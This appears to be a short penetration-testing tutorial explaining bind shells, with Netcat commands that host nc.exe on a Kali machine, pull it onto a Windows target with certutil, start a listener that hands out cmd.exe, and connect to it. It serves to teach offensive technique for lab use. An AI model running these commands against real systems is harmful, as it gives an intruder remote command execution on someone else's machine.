A **bind shell** is a remote shell where the attacker connects to a listener on the target system; though often blocked or flagged, it's important to understand how it works and how to set it up using Netcat.
In order to setup a bind shell with Netcat, we will need to transfer the nc.exe executable to the target system.

```shell
# The first step will involve navigating to the /usr/share/windows-binaries directory
cd /usr/share/windows-binaries/

# We can then setup an HTTP server with Python within this directory by running the following command
python -m SimpleHTTPServer 80

# You will then need to open up a command prompt, navigate to the Desktop directory and run the following command to download the nc.exe executable from the web server being hosted on the Kali Linux system
certutil -urlcache -f http://<my_kali_IP>/nc.exe nc.exe

# Setting up the bind shell listener on the Windows system
.\nc.exe -nvlp 1234 -e cmd.exe

# Back to Kali shell
nc -nv <target_IP> 1234
```
